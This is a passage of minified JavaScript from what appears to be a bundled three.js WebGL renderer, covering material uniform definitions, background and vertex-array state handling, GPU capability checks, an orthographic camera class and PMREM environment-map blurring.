dCube_vert:mu,backgroundCube_frag:_u,cube_vert:gu,cube_frag:vu,depth_vert:xu,depth_frag:Eu,distanceRGBA_vert:yu,distanceRGBA_frag:Mu,equirect_vert:Su,equirect_frag:bu,linedashed_vert:Tu,linedashed_frag:Au,meshbasic_vert:Ru,meshbasic_frag:wu,meshlambert_vert:Cu,meshlambert_frag:Pu,meshmatcap_vert:Iu,meshmatcap_frag:Lu,meshnormal_vert:Du,meshnormal_frag:Nu,meshphong_vert:Uu,meshphong_frag:Ou,meshphysical_vert:Fu,meshphysical_frag:ku,meshtoon_vert:Bu,meshtoon_frag:zu,points_vert:Gu,points_frag:Hu,shadow_vert:Vu,shadow_frag:Wu,sprite_vert:Xu,sprite_frag:qu},it={common:{diffuse:{value:new Ht(16777215)},opacity:{value:1},map:{value:null},mapTransform:{value:new kt},alphaMap:{value:null},alphaMapTransform:{value:new kt},alphaTest:{value:0}},specularmap:{specularMap:{value:null},specularMapTransform:{value:new kt}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1},aoMapTransform:{value:new kt}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1},lightMapTransform:{value:new kt}},bumpmap:{bumpMap:{value:null},bumpMapTransform:{value:new kt},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalMapTransform:{value:new kt},normalScale:{value:new zt(1,1)}},displacementmap:{displacementMap:{value:null},displacementMapTransform:{value:new kt},displacementScale:{value:1},displacementBias:{value:0}},emissivemap:{emissiveMap:{value:null},emissiveMapTransform:{value:new kt}},metalnessmap:{metalnessMap:{value:null},metalnessMapTransform:{value:new kt}},roughnessmap:{roughnessMap:{value:null},roughnessMapTransform:{value:new kt}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new Ht(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotLightMap:{value:[]},spotShadowMap:{value:[]},spotLightMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new Ht(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaMapTransform:{value:new kt},alphaTest:{value:0},uvTransform:{value:new kt}},sprite:{diffuse:{value:new Ht(16777215)},opacity:{value:1},center:{value:new zt(.5,.5)},rotation:{value:0},map:{value:null},mapTransform:{value:new kt},alphaMap:{value:null},alphaMapTransform:{value:new kt},alphaTest:{value:0}}},Ge={basic:{uniforms:_e([it.common,it.specularmap,it.envmap,it.aomap,it.lightmap,it.fog]),vertexShader:It.meshbasic_vert,fragmentShader:It.meshbasic_frag},lambert:{uniforms:_e([it.common,it.specularmap,it.envmap,it.aomap,it.lightmap,it.emissivemap,it.bumpmap,it.normalmap,it.displacementmap,it.fog,it.lights,{emissive:{value:new Ht(0)}}]),vertexShader:It.meshlambert_vert,fragmentShader:It.meshlambert_frag},phong:{uniforms:_e([it.common,it.specularmap,it.envmap,it.aomap,it.lightmap,it.emissivemap,it.bumpmap,it.normalmap,it.displacementmap,it.fog,it.lights,{emissive:{value:new Ht(0)},specular:{value:new Ht(1118481)},shininess:{value:30}}]),vertexShader:It.meshphong_vert,fragmentShader:It.meshphong_frag},standard:{uniforms:_e([it.common,it.envmap,it.aomap,it.lightmap,it.emissivemap,it.bumpmap,it.normalmap,it.displacementmap,it.roughnessmap,it.metalnessmap,it.fog,it.lights,{emissive:{value:new Ht(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:It.meshphysical_vert,fragmentShader:It.meshphysical_frag},toon:{uniforms:_e([it.common,it.aomap,it.lightmap,it.emissivemap,it.bumpmap,it.normalmap,it.displacementmap,it.gradientmap,it.fog,it.lights,{emissive:{value:new Ht(0)}}]),vertexShader:It.meshtoon_vert,fragmentShader:It.meshtoon_frag},matcap:{uniforms:_e([it.common,it.bumpmap,it.normalmap,it.displacementmap,it.fog,{matcap:{value:null}}]),vertexShader:It.meshmatcap_vert,fragmentShader:It.meshmatcap_frag},points:{uniforms:_e([it.points,it.fog]),vertexShader:It.points_vert,fragmentShader:It.points_frag},dashed:{uniforms:_e([it.common,it.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:It.linedashed_vert,fragmentShader:It.linedashed_frag},depth:{uniforms:_e([it.common,it.displacementmap]),vertexShader:It.depth_vert,fragmentShader:It.depth_frag},normal:{uniforms:_e([it.common,it.bumpmap,it.normalmap,it.displacementmap,{opacity:{value:1}}]),vertexShader:It.meshnormal_vert,fragmentShader:It.meshnormal_frag},sprite:{uniforms:_e([it.sprite,it.fog]),vertexShader:It.sprite_vert,fragmentShader:It.sprite_frag},background:{uniforms:{uvTransform:{value:new kt},t2D:{value:null},backgroundIntensity:{value:1}},vertexShader:It.background_vert,fragmentShader:It.background_frag},backgroundCube:{uniforms:{envMap:{value:null},flipEnvMap:{value:-1},backgroundBlurriness:{value:0},backgroundIntensity:{value:1}},vertexShader:It.backgroundCube_vert,fragmentShader:It.backgroundCube_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:It.cube_vert,fragmentShader:It.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:It.equirect_vert,fragmentShader:It.equirect_frag},distanceRGBA:{uniforms:_e([it.common,it.displacementmap,{referencePosition:{value:new L},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:It.distanceRGBA_vert,fragmentShader:It.distanceRGBA_frag},shadow:{uniforms:_e([it.lights,it.fog,{color:{value:new Ht(0)},opacity:{value:1}}]),vertexShader:It.shadow_vert,fragmentShader:It.shadow_frag}};Ge.physical={uniforms:_e([Ge.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatMapTransform:{value:new kt},clearcoatNormalMap:{value:null},clearcoatNormalMapTransform:{value:new kt},clearcoatNormalScale:{value:new zt(1,1)},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatRoughnessMapTransform:{value:new kt},iridescence:{value:0},iridescenceMap:{value:null},iridescenceMapTransform:{value:new kt},iridescenceIOR:{value:1.3},iridescenceThicknessMinimum:{value:100},iridescenceThicknessMaximum:{value:400},iridescenceThicknessMap:{value:null},iridescenceThicknessMapTransform:{value:new kt},sheen:{value:0},sheenColor:{value:new Ht(0)},sheenColorMap:{value:null},sheenColorMapTransform:{value:new kt},sheenRoughness:{value:1},sheenRoughnessMap:{value:null},sheenRoughnessMapTransform:{value:new kt},transmission:{value:0},transmissionMap:{value:null},transmissionMapTransform:{value:new kt},transmissionSamplerSize:{value:new zt},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},thicknessMapTransform:{value:new kt},attenuationDistance:{value:0},attenuationColor:{value:new Ht(0)},specularColor:{value:new Ht(1,1,1)},specularColorMap:{value:null},specularColorMapTransform:{value:new kt},specularIntensity:{value:1},specularIntensityMap:{value:null},specularIntensityMapTransform:{value:new kt},anisotropyVector:{value:new zt},anisotropyMap:{value:null},anisotropyMapTransform:{value:new kt}}]),vertexShader:It.meshphysical_vert,fragmentShader:It.meshphysical_frag};const Gi={r:0,b:0,g:0};function Yu(i,t,e,n,r,s,o){const a=new Ht(0);let l=s===!0?0:1,c,u,h=null,p=0,m=null;function E(f,d){let g=!1,_=d.isScene===!0?d.background:null;_&&_.isTexture&&(_=(d.backgroundBlurriness>0?e:t).get(_)),_===null?x(a,l):_&&_.isColor&&(x(_,1),g=!0);const v=i.xr.getEnvironmentBlendMode();v==="additive"?n.buffers.color.setClear(0,0,0,1,o):v==="alpha-blend"&&n.buffers.color.setClear(0,0,0,0,o),(i.autoClear||g)&&i.clear(i.autoClearColor,i.autoClearDepth,i.autoClearStencil),_&&(_.isCubeTexture||_.mapping===er)?(u===void 0&&(u=new He(new vi(1,1,1),new An({name:"BackgroundCubeMaterial",uniforms:Jn(Ge.backgroundCube.uniforms),vertexShader:Ge.backgroundCube.vertexShader,fragmentShader:Ge.backgroundCube.fragmentShader,side:Ee,depthTest:!1,depthWrite:!1,fog:!1})),u.geometry.deleteAttribute("normal"),u.geometry.deleteAttribute("uv"),u.onBeforeRender=function(w,S,T){this.matrixWorld.copyPosition(T.matrixWorld)},Object.defineProperty(u.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),r.update(u)),u.material.uniforms.envMap.value=_,u.material.uniforms.flipEnvMap.value=_.isCubeTexture&&_.isRenderTargetTexture===!1?-1:1,u.material.uniforms.backgroundBlurriness.value=d.backgroundBlurriness,u.material.uniforms.backgroundIntensity.value=d.backgroundIntensity,u.material.toneMapped=Wt.getTransfer(_.colorSpace)!==jt,(h!==_||p!==_.version||m!==i.toneMapping)&&(u.material.needsUpdate=!0,h=_,p=_.version,m=i.toneMapping),u.layers.enableAll(),f.unshift(u,u.geometry,u.material,0,0,null)):_&&_.isTexture&&(c===void 0&&(c=new He(new ds(2,2),new An({name:"BackgroundMaterial",uniforms:Jn(Ge.background.uniforms),vertexShader:Ge.background.vertexShader,fragmentShader:Ge.background.fragmentShader,side:cn,depthTest:!1,depthWrite:!1,fog:!1})),c.geometry.deleteAttribute("normal"),Object.defineProperty(c.material,"map",{get:function(){return this.uniforms.t2D.value}}),r.update(c)),c.material.uniforms.t2D.value=_,c.material.uniforms.backgroundIntensity.value=d.backgroundIntensity,c.material.toneMapped=Wt.getTransfer(_.colorSpace)!==jt,_.matrixAutoUpdate===!0&&_.updateMatrix(),c.material.uniforms.uvTransform.value.copy(_.matrix),(h!==_||p!==_.version||m!==i.toneMapping)&&(c.material.needsUpdate=!0,h=_,p=_.version,m=i.toneMapping),c.layers.enableAll(),f.unshift(c,c.geometry,c.material,0,0,null))}function x(f,d){f.getRGB(Gi,Eo(i)),n.buffers.color.setClear(Gi.r,Gi.g,Gi.b,d,o)}return{getClearColor:function(){return a},setClearColor:function(f,d=1){a.set(f),l=d,x(a,l)},getClearAlpha:function(){return l},setClearAlpha:function(f){l=f,x(a,l)},render:E}}function ju(i,t,e,n){const r=i.getParameter(i.MAX_VERTEX_ATTRIBS),s=n.isWebGL2?null:t.get("OES_vertex_array_object"),o=n.isWebGL2||s!==null,a={},l=f(null);let c=l,u=!1;function h(P,B,W,Y,H){let V=!1;if(o){const q=x(Y,W,B);c!==q&&(c=q,m(c.object)),V=d(P,Y,W,H),V&&g(P,Y,W,H)}else{const q=B.wireframe===!0;(c.geometry!==Y.id||c.program!==W.id||c.wireframe!==q)&&(c.geometry=Y.id,c.program=W.id,c.wireframe=q,V=!0)}H!==null&&e.update(H,i.ELEMENT_ARRAY_BUFFER),(V||u)&&(u=!1,D(P,B,W,Y),H!==null&&i.bindBuffer(i.ELEMENT_ARRAY_BUFFER,e.get(H).buffer))}function p(){return n.isWebGL2?i.createVertexArray():s.createVertexArrayOES()}function m(P){return n.isWebGL2?i.bindVertexArray(P):s.bindVertexArrayOES(P)}function E(P){return n.isWebGL2?i.deleteVertexArray(P):s.deleteVertexArrayOES(P)}function x(P,B,W){const Y=W.wireframe===!0;let H=a[P.id];H===void 0&&(H={},a[P.id]=H);let V=H[B.id];V===void 0&&(V={},H[B.id]=V);let q=V[Y];return q===void 0&&(q=f(p()),V[Y]=q),q}function f(P){const B=[],W=[],Y=[];for(let H=0;H<r;H++)B[H]=0,W[H]=0,Y[H]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:B,enabledAttributes:W,attributeDivisors:Y,object:P,attributes:{},index:null}}function d(P,B,W,Y){const H=c.attributes,V=B.attributes;let q=0;const J=W.getAttributes();for(const K in J)if(J[K].location>=0){const j=H[K];let rt=V[K];if(rt===void 0&&(K==="instanceMatrix"&&P.instanceMatrix&&(rt=P.instanceMatrix),K==="instanceColor"&&P.instanceColor&&(rt=P.instanceColor)),j===void 0||j.attribute!==rt||rt&&j.data!==rt.data)return!0;q++}return c.attributesNum!==q||c.index!==Y}function g(P,B,W,Y){const H={},V=B.attributes;let q=0;const J=W.getAttributes();for(const K in J)if(J[K].location>=0){let j=V[K];j===void 0&&(K==="instanceMatrix"&&P.instanceMatrix&&(j=P.instanceMatrix),K==="instanceColor"&&P.instanceColor&&(j=P.instanceColor));const rt={};rt.attribute=j,j&&j.data&&(rt.data=j.data),H[K]=rt,q++}c.attributes=H,c.attributesNum=q,c.index=Y}function _(){const P=c.newAttributes;for(let B=0,W=P.length;B<W;B++)P[B]=0}function v(P){w(P,0)}function w(P,B){const W=c.newAttributes,Y=c.enabledAttributes,H=c.attributeDivisors;W[P]=1,Y[P]===0&&(i.enableVertexAttribArray(P),Y[P]=1),H[P]!==B&&((n.isWebGL2?i:t.get("ANGLE_instanced_arrays"))[n.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](P,B),H[P]=B)}function S(){const P=c.newAttributes,B=c.enabledAttributes;for(let W=0,Y=B.length;W<Y;W++)B[W]!==P[W]&&(i.disableVertexAttribArray(W),B[W]=0)}function T(P,B,W,Y,H,V,q){q===!0?i.vertexAttribIPointer(P,B,W,H,V):i.vertexAttribPointer(P,B,W,Y,H,V)}function D(P,B,W,Y){if(n.isWebGL2===!1&&(P.isInstancedMesh||Y.isInstancedBufferGeometry)&&t.get("ANGLE_instanced_arrays")===null)return;_();const H=Y.attributes,V=W.getAttributes(),q=B.defaultAttributeValues;for(const J in V){const K=V[J];if(K.location>=0){let G=H[J];if(G===void 0&&(J==="instanceMatrix"&&P.instanceMatrix&&(G=P.instanceMatrix),J==="instanceColor"&&P.instanceColor&&(G=P.instanceColor)),G!==void 0){const j=G.normalized,rt=G.itemSize,pt=e.get(G);if(pt===void 0)continue;const ut=pt.buffer,St=pt.type,Tt=pt.bytesPerElement,gt=n.isWebGL2===!0&&(St===i.INT||St===i.UNSIGNED_INT||G.gpuType===io);if(G.isInterleavedBufferAttribute){const Ut=G.data,N=Ut.stride,ne=G.offset;if(Ut.isInstancedInterleavedBuffer){for(let vt=0;vt<K.locationSize;vt++)w(K.location+vt,Ut.meshPerAttribute);P.isInstancedMesh!==!0&&Y._maxInstanceCount===void 0&&(Y._maxInstanceCount=Ut.meshPerAttribute*Ut.count)}else for(let vt=0;vt<K.locationSize;vt++)v(K.location+vt);i.bindBuffer(i.ARRAY_BUFFER,ut);for(let vt=0;vt<K.locationSize;vt++)T(K.location+vt,rt/K.locationSize,St,j,N*Tt,(ne+rt/K.locationSize*vt)*Tt,gt)}else{if(G.isInstancedBufferAttribute){for(let Ut=0;Ut<K.locationSize;Ut++)w(K.location+Ut,G.meshPerAttribute);P.isInstancedMesh!==!0&&Y._maxInstanceCount===void 0&&(Y._maxInstanceCount=G.meshPerAttribute*G.count)}else for(let Ut=0;Ut<K.locationSize;Ut++)v(K.location+Ut);i.bindBuffer(i.ARRAY_BUFFER,ut);for(let Ut=0;Ut<K.locationSize;Ut++)T(K.location+Ut,rt/K.locationSize,St,j,rt*Tt,rt/K.locationSize*Ut*Tt,gt)}}else if(q!==void 0){const j=q[J];if(j!==void 0)switch(j.length){case 2:i.vertexAttrib2fv(K.location,j);break;case 3:i.vertexAttrib3fv(K.location,j);break;case 4:i.vertexAttrib4fv(K.location,j);break;default:i.vertexAttrib1fv(K.location,j)}}}}S()}function y(){X();for(const P in a){const B=a[P];for(const W in B){const Y=B[W];for(const H in Y)E(Y[H].object),delete Y[H];delete B[W]}delete a[P]}}function R(P){if(a[P.id]===void 0)return;const B=a[P.id];for(const W in B){const Y=B[W];for(const H in Y)E(Y[H].object),delete Y[H];delete B[W]}delete a[P.id]}function k(P){for(const B in a){const W=a[B];if(W[P.id]===void 0)continue;const Y=W[P.id];for(const H in Y)E(Y[H].object),delete Y[H];delete W[P.id]}}function X(){et(),u=!0,c!==l&&(c=l,m(c.object))}function et(){l.geometry=null,l.program=null,l.wireframe=!1}return{setup:h,reset:X,resetDefaultState:et,dispose:y,releaseStatesOfGeometry:R,releaseStatesOfProgram:k,initAttributes:_,enableAttribute:v,disableUnusedAttributes:S}}function $u(i,t,e,n){const r=n.isWebGL2;let s;function o(u){s=u}function a(u,h){i.drawArrays(s,u,h),e.update(h,s,1)}function l(u,h,p){if(p===0)return;let m,E;if(r)m=i,E="drawArraysInstanced";else if(m=t.get("ANGLE_instanced_arrays"),E="drawArraysInstancedANGLE",m===null){console.error("THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");return}m[E](s,u,h,p),e.update(h,s,p)}function c(u,h,p){if(p===0)return;const m=t.get("WEBGL_multi_draw");if(m===null)for(let E=0;E<p;E++)this.render(u[E],h[E]);else{m.multiDrawArraysWEBGL(s,u,0,h,0,p);let E=0;for(let x=0;x<p;x++)E+=h[x];e.update(E,s,1)}}this.setMode=o,this.render=a,this.renderInstances=l,this.renderMultiDraw=c}function Ku(i,t,e){let n;function r(){if(n!==void 0)return n;if(t.has("EXT_texture_filter_anisotropic")===!0){const T=t.get("EXT_texture_filter_anisotropic");n=i.getParameter(T.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else n=0;return n}function s(T){if(T==="highp"){if(i.getShaderPrecisionFormat(i.VERTEX_SHADER,i.HIGH_FLOAT).precision>0&&i.getShaderPrecisionFormat(i.FRAGMENT_SHADER,i.HIGH_FLOAT).precision>0)return"highp";T="mediump"}return T==="mediump"&&i.getShaderPrecisionFormat(i.VERTEX_SHADER,i.MEDIUM_FLOAT).precision>0&&i.getShaderPrecisionFormat(i.FRAGMENT_SHADER,i.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}const o=typeof WebGL2RenderingContext<"u"&&i.constructor.name==="WebGL2RenderingContext";let a=e.precision!==void 0?e.precision:"highp";const l=s(a);l!==a&&(console.warn("THREE.WebGLRenderer:",a,"not supported, using",l,"instead."),a=l);const c=o||t.has("WEBGL_draw_buffers"),u=e.logarithmicDepthBuffer===!0,h=i.getParameter(i.MAX_TEXTURE_IMAGE_UNITS),p=i.getParameter(i.MAX_VERTEX_TEXTURE_IMAGE_UNITS),m=i.getParameter(i.MAX_TEXTURE_SIZE),E=i.getParameter(i.MAX_CUBE_MAP_TEXTURE_SIZE),x=i.getParameter(i.MAX_VERTEX_ATTRIBS),f=i.getParameter(i.MAX_VERTEX_UNIFORM_VECTORS),d=i.getParameter(i.MAX_VARYING_VECTORS),g=i.getParameter(i.MAX_FRAGMENT_UNIFORM_VECTORS),_=p>0,v=o||t.has("OES_texture_float"),w=_&&v,S=o?i.getParameter(i.MAX_SAMPLES):0;return{isWebGL2:o,drawBuffers:c,getMaxAnisotropy:r,getMaxPrecision:s,precision:a,logarithmicDepthBuffer:u,maxTextures:h,maxVertexTextures:p,maxTextureSize:m,maxCubemapSize:E,maxAttributes:x,maxVertexUniforms:f,maxVaryings:d,maxFragmentUniforms:g,vertexTextures:_,floatFragmentTextures:v,floatVertexTextures:w,maxSamples:S}}function Zu(i){const t=this;let e=null,n=0,r=!1,s=!1;const o=new _n,a=new kt,l={value:null,needsUpdate:!1};this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(h,p){const m=h.length!==0||p||n!==0||r;return r=p,n=h.length,m},this.beginShadows=function(){s=!0,u(null)},this.endShadows=function(){s=!1},this.setGlobalState=function(h,p){e=u(h,p,0)},this.setState=function(h,p,m){const E=h.clippingPlanes,x=h.clipIntersection,f=h.clipShadows,d=i.get(h);if(!r||E===null||E.length===0||s&&!f)s?u(null):c();else{const g=s?0:n,_=g*4;let v=d.clippingState||null;l.value=v,v=u(E,p,_,m);for(let w=0;w!==_;++w)v[w]=e[w];d.clippingState=v,this.numIntersection=x?this.numPlanes:0,this.numPlanes+=g}};function c(){l.value!==e&&(l.value=e,l.needsUpdate=n>0),t.numPlanes=n,t.numIntersection=0}function u(h,p,m,E){const x=h!==null?h.length:0;let f=null;if(x!==0){if(f=l.value,E!==!0||f===null){const d=m+x*4,g=p.matrixWorldInverse;a.getNormalMatrix(g),(f===null||f.length<d)&&(f=new Float32Array(d));for(let _=0,v=m;_!==x;++_,v+=4)o.copy(h[_]).applyMatrix4(g,a),o.normal.toArray(f,v),f[v+3]=o.constant}l.value=f,l.needsUpdate=!0}return t.numPlanes=x,t.numIntersection=0,f}}function Ju(i){let t=new WeakMap;function e(o,a){return a===$r?o.mapping=$n:a===Kr&&(o.mapping=Kn),o}function n(o){if(o&&o.isTexture){const a=o.mapping;if(a===$r||a===Kr)if(t.has(o)){const l=t.get(o).texture;return e(l,o.mapping)}else{const l=o.image;if(l&&l.height>0){const c=new dc(l.height/2);return c.fromEquirectangularTexture(i,o),t.set(o,c),o.addEventListener("dispose",r),e(c.texture,o.mapping)}else return null}}return o}function r(o){const a=o.target;a.removeEventListener("dispose",r);const l=t.get(a);l!==void 0&&(t.delete(a),l.dispose())}function s(){t=new WeakMap}return{get:n,dispose:s}}class Qu extends yo{constructor(t=-1,e=1,n=1,r=-1,s=.1,o=2e3){super(),this.isOrthographicCamera=!0,this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=t,this.right=e,this.top=n,this.bottom=r,this.near=s,this.far=o,this.updateProjectionMatrix()}copy(t,e){return super.copy(t,e),this.left=t.left,this.right=t.right,this.top=t.top,this.bottom=t.bottom,this.near=t.near,this.far=t.far,this.zoom=t.zoom,this.view=t.view===null?null:Object.assign({},t.view),this}setViewOffset(t,e,n,r,s,o){this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=t,this.view.fullHeight=e,this.view.offsetX=n,this.view.offsetY=r,this.view.width=s,this.view.height=o,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const t=(this.right-this.left)/(2*this.zoom),e=(this.top-this.bottom)/(2*this.zoom),n=(this.right+this.left)/2,r=(this.top+this.bottom)/2;let s=n-t,o=n+t,a=r+e,l=r-e;if(this.view!==null&&this.view.enabled){const c=(this.right-this.left)/this.view.fullWidth/this.zoom,u=(this.top-this.bottom)/this.view.fullHeight/this.zoom;s+=c*this.view.offsetX,o=s+c*this.view.width,a-=u*this.view.offsetY,l=a-u*this.view.height}this.projectionMatrix.makeOrthographic(s,o,a,l,this.near,this.far,this.coordinateSystem),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(t){const e=super.toJSON(t);return e.object.zoom=this.zoom,e.object.left=this.left,e.object.right=this.right,e.object.top=this.top,e.object.bottom=this.bottom,e.object.near=this.near,e.object.far=this.far,this.view!==null&&(e.object.view=Object.assign({},this.view)),e}}const Xn=4,va=[.125,.215,.35,.446,.526,.582],xn=20,Ur=new Qu,xa=new Ht;let Or=null,Fr=0,kr=0;const gn=(1+Math.sqrt(5))/2,Vn=1/gn,Ea=[new L(1,1,1),new L(-1,1,1),new L(1,1,-1),new L(-1,1,-1),new L(0,gn,Vn),new L(0,gn,-Vn),new L(Vn,0,gn),new L(-Vn,0,gn),new L(gn,Vn,0),new L(-gn,Vn,0)];class ya{constructor(t){this._renderer=t,this._pingPongRenderTarget=null,this._lodMax=0,this._cubeSize=0,this._lodPlanes=[],this._sizeLods=[],this._sigmas=[],this._blurMaterial=null,this._cubemapMaterial=null,this._equirectMaterial=null,this._compileMaterial(this._blurMaterial)}fromScene(t,e=0,n=.1,r=100){Or=this._renderer.getRenderTarget(),Fr=this._renderer.getActiveCubeFace(),kr=this._renderer.getActiveMipmapLevel(),this._setSize(256);const s=this._allocateTargets();return s.depthBuffer=!0,this._sceneToCubeUV(t,n,r,s),e>0&&this._blur(s,0,0,e),this._applyPMREM(s),this._cleanup(s),s}fromEquirectangular(t,e=null){return this._fromTexture(t,e)}fromCubemap(t,e=null){return this._fromTexture(t,e)}compileCubemapShader(){this._cubemapMaterial===null&&(this._cubemapMaterial=ba(),this._compileMaterial(this._cubemapMaterial))}compileEquirectangularShader(){this._equirectMaterial===null&&(this._equirectMaterial=Sa(),this._compileMaterial(this._equirectMaterial))}dispose(){this._dispose(),this._cubemapMaterial!==null&&this._cubemapMaterial.dispose(),this._equirectMaterial!==null&&this._equirectMaterial.dispose()}_setSize(t){this._lodMax=Math.floor(Math.log2(t)),this._cubeSize=Math.pow(2,this._lodMax)}_dispose(){this._blurMaterial!==null&&this._blurMaterial.dispose(),this._pingPongRenderTarget!==null&&this._pingPongRenderTarget.dispose();for(let t=0;t<this._lodPlanes.length;t++)this._lodPlanes[t].dispose()}_cleanup(t){this._renderer.setRenderTarget(Or,Fr,kr),t.scissorTest=!1,Hi(t,0,0,t.width,t.height)}_fromTexture(t,e){t.mapping===$n||t.mapping===Kn?this._setSize(t.image.length===0?16:t.image[0].width||t.image[0].image.width):this._setSize(t.image.width/4),Or=this._renderer.getRenderTarget(),Fr=this._renderer.getActiveCubeFace(),kr=this._renderer.getActiveMipmapLevel();const n=e||this._allocateTargets();return this._textureToCubeUV(t,n),this._applyPMREM(n),this._cleanup(n),n}_allocateTargets(){const t=3*Math.max(this._cubeSize,112),e=4*this._cubeSize,n={magFilter:we,minFilter:we,generateMipmaps:!1,type:hi,format:ke,colorSpace:Ze,depthBuffer:!1},r=Ma(t,e,n);if(this._pingPongRenderTarget===null||this._pingPongRenderTarget.width!==t||this._pingPongRenderTarget.height!==e){this._pingPongRenderTarget!==null&&this._dispose(),this._pingPongRenderTarget=Ma(t,e,n);const{_lodMax:s}=this;({sizeLods:this._sizeLods,lodPlanes:this._lodPlanes,sigmas:this._sigmas}=tp(s)),this._blurMaterial=ep(s,t,e)}return r}_compileMaterial(t){const e=new He(this._lodPlanes[0],t);this._renderer.compile(e,Ur)}_sceneToCubeUV(t,e,n,r){const a=new Ce(90,1,e,n),l=[1,-1,1,1,1,1],c=[1,1,1,-1,-1,-1],u=this._renderer,h=u.autoClear,p=u.toneMapping;u.getClearColor(xa),u.toneMapping=on,u.autoClear=!1;const m=new pi({name:"PMREM.Background",side:Ee,depthWrite:!1,depthTest:!1}),E=new He(new vi,m);let x=!1;const f=t.background;f?f.isColor&&(m.color.copy(f),t.background=null,x=!0):(m.color.copy(xa),x=!0);for(let d=0;d<6;d++){const g=d%3;g===0?(a.up.set(0,l[d],0),a.lookAt(c[d],0,0)):g===1?(a.up.set(0,0,l[d]),a.lookAt(0,c[d],0)):(a.up.set(0,l[d],0),a.lookAt(0,0,c[d]));const _=this._cubeSize;Hi(r,g*_,d>2?_:0,_,_),u.setRenderTarget(r),x&&u.render(E,a),u.render(t,a)}E.geometry.dispose(),E.material.dispose(),u.toneMapping=p,u.autoClear=h,t.background=f}_textureToCubeUV(t,e){const n=this._renderer,r=t.mapping===$n||t.mapping===Kn;r?(this._cubemapMaterial===null&&(this._cubemapMaterial=ba()),this._cubemapMaterial.uniforms.flipEnvMap.value=t.isRenderTargetTexture===!1?-1:1):this._equirectMaterial===null&&(this._equirectMaterial=Sa());const s=r?this._cubemapMaterial:this._equirectMaterial,o=new He(this._lodPlanes[0],s),a=s.uniforms;a.envMap.value=t;const l=this._cubeSize;Hi(e,0,0,3*l,2*l),n.setRenderTarget(e),n.render(o,Ur)}_applyPMREM(t){const e=this._renderer,n=e.autoClear;e.autoClear=!1;for(let r=1;r<this._lodPlanes.length;r++){const s=Math.sqrt(this._sigmas[r]*this._sigmas[r]-this._sigmas[r-1]*this._sigmas[r-1]),o=Ea[(r-1)%Ea.length];this._blur(t,r-1,r,s,o)}e.autoClear=n}_blur(t,e,n,r,s){const o=this._pingPongRenderTarget;this._halfBlur(t,o,e,n,r,"latitudinal",s),this._halfBlur(o,t,n,n,r,"longitudinal",s)}_halfBlur(t,e,n,r,s,o,a){const l=this._renderer,c=this._blurMaterial;o!=="latitudinal"&&o!=="longitudinal"&&console.error("blur direction must be either latitudinal or longitudinal!");const u=3,h=new He(this._lodPlanes[r],c),p=c.uniforms,m=this._sizeLods[n]-1,E=isFinite(s)?Math.PI/(2*m):2*Math.PI/(2*xn-1),x=s/E,f=isFinite(s)?1+Math.floor(u*x):xn;f>xn&&console.warn(`sigmaRadians, ${s}, is too large and will clip, as it requested ${f} samples when the maximum is set to ${xn}`);const d=[];let g=0;for(let T=0;T<xn;++T){const D=T/x,y=Math.exp(-D*D/2);d.push(y),T===0?g+=y:T<f&&(g+=2*y)}for(let T=0;T<d.length;T++)d[T]=d[T]/g;p.envMap.value=t.texture,p.samples.value=f,p.weights.value=d,p.latitudinal.value=o==="latitudinal",a&&(p.poleAxis.value=a);const{_lodMax:_}=this;p.dTheta.value=E,p.mipInt.value=_-n;const v=this._sizeLods[r],w=3*v*(r>_-Xn?r-_+Xn:0),S=4*(this._cubeSize-v);Hi(e,w,S,3*v,2*v),l.setRenderTarget(e),l.render(h,Ur)}}function tp(i){const t=[],e=[],n=[];let r=i;const s=i-Xn+1+va.length;for(let o=0;o<s;o++){const 